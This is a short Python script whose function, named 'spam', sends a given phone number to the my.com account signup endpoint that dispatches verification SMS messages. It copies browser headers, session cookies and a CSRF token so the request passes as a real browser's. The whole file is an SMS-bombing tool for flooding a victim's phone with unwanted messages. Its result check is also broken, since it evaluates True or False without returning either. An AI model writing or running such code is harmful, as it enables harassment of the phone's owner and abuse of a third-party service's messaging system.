import requests, json
def spam(no):
    headers={
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection':'keep-alive',
        'Content-Length':'53',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie':'csrf_token=z6KBadX4wV2tIu0KodhSKD; p=RgAAAPbdewAA; mrcu=C8655F1D81F018A0A697B0FDD770; s=dpr=1; __utma=144340137.619377147.1595769333.1595769333.1595769333.1; __utmc=144340137; __utmz=144340137.1595769333.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=144340137.1.10.1595769333; mr1lad=5f1d81f446bed5db-300-300-; t_300=1',
        'DNT':'1',
        'Host':'account.my.com',
        'Origin':'https://account.my.com',
        'Referer':'https://account.my.com/signup/',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
        'X-Requested-With':'XMLHttpRequest'
    }
    data={
        'phone':no,
        'csrf_token':'z6KBadX4wV2tIu0KodhSKD'
    }
    if json.loads(requests.post('https://account.my.com/signup_send_sms/', data=data, headers=headers).text)['status'] == '200':
        True
    else:
        False